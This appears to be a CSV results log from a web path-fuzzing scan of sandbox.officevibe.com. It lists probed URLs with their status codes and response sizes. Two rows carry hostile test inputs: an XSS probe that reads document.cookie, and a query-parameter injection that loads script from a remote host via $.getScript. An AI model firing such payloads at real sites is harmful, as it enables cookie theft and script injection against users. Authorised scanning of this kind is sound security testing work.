FUZZ,url,redirectlocation,position,status_code,content_length,content_words,content_lines,content_type,duration,resultfile
portal/update.php,https://sandbox.officevibe.com/portal/update.php,,1191,200,2808,111,9,text/html,91.321203ms,
portal.css,https://sandbox.officevibe.com/portal.css,,2372,200,2808,111,9,text/html,89.975801ms,
portal_member_check_call.jsp,https://sandbox.officevibe.com/portal_member_check_call.jsp,,4184,200,2808,111,9,text/html,53.886941ms,
portal/employer/alternativeCareSelection.do,https://sandbox.officevibe.com/portal/employer/alternativeCareSelection.do,,4508,200,2808,111,9,text/html,51.744766ms,
portalcreatesuccess.aspx,https://sandbox.officevibe.com/portalcreatesuccess.aspx,,5204,200,2808,111,9,text/html,51.923328ms,
portal/app/mockapp/login.jsp?lrid=1,https://sandbox.officevibe.com/portal/app/mockapp/login.jsp?lrid=1,,5767,200,2808,111,9,text/html,57.199672ms,
portal/assets/greece/map.htm,https://sandbox.officevibe.com/portal/assets/greece/map.htm,,5819,200,2808,111,9,text/html,54.588185ms,
portal/broker/dentalselect.sdo,https://sandbox.officevibe.com/portal/broker/dentalselect.sdo,,7246,200,2808,111,9,text/html,56.066661ms,
portal_id_login.jsp,https://sandbox.officevibe.com/portal_id_login.jsp,,8331,200,2808,111,9,text/html,56.302349ms,
portal/shopping/dentalSelect.sdo,https://sandbox.officevibe.com/portal/shopping/dentalSelect.sdo,,9804,200,2808,111,9,text/html,63.640371ms,
portal/member/alternativeCareSelection.do,https://sandbox.officevibe.com/portal/member/alternativeCareSelection.do,,13642,200,2808,111,9,text/html,69.31317ms,
servlet/CookieExample?cookiename=<script>alert(document.cookie)(\,https://sandbox.officevibe.com/servlet/CookieExample?cookiename=<script>alert(document.cookie)(\,,15840,500,75,12,1,text/html,357.618727ms,
portal/provider/search.ndo,https://sandbox.officevibe.com/portal/provider/search.ndo,,16629,200,2808,111,9,text/html,62.751062ms,
portal.html,https://sandbox.officevibe.com/portal.html,,16905,200,2808,111,9,text/html,93.079075ms,
portal/maintainers.txt,https://sandbox.officevibe.com/portal/maintainers.txt,,17032,200,2808,111,9,text/html,50.476856ms,
hostapd_ssid=.*/hostapd_ssid=\\\,https://sandbox.officevibe.com/hostapd_ssid=.*/hostapd_ssid=\\\,https://sandbox.officevibe.com/hostapd_ssid=.*/hostapd_ssid=,18108,301,1407,270,21,text/html; charset=UTF-8,183.138879ms,
portal_index.jsp,https://sandbox.officevibe.com/portal_index.jsp,,18711,200,2808,111,9,text/html,51.837381ms,
portal/admin/default.aspx,https://sandbox.officevibe.com/portal/admin/default.aspx,,19018,200,2808,111,9,text/html,51.589241ms,
Portal.do,https://sandbox.officevibe.com/Portal.do,,19300,200,2808,111,9,text/html,54.846745ms,
portal/member/dentalSelect.sdo,https://sandbox.officevibe.com/portal/member/dentalSelect.sdo,,19455,200,2808,111,9,text/html,59.526523ms,
?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,https://sandbox.officevibe.com/?mobile=1&mp_idx=%22;$.getScript(%27//127.0.0.1/z%27);/,,20499,200,4239,480,84,text/html; charset=utf-8,204.063272ms,
portal/xmlrpc.php,https://sandbox.officevibe.com/portal/xmlrpc.php,,21026,200,2808,111,9,text/html,54.917626ms,
PortalSources/Portal.ini.php,https://sandbox.officevibe.com/PortalSources/Portal.ini.php,,21525,200,2808,111,9,text/html,51.748726ms,
PortalCustomSearch.aspx,https://sandbox.officevibe.com/PortalCustomSearch.aspx,,22082,200,2808,111,9,text/html,49.605904ms,
portal_ads.jsp,https://sandbox.officevibe.com/portal_ads.jsp,,25017,200,2808,111,9,text/html,52.681095ms,
portal/employer/alternativeCareSelection.sdo,https://sandbox.officevibe.com/portal/employer/alternativeCareSelection.sdo,,25485,200,2808,111,9,text/html,51.960529ms,
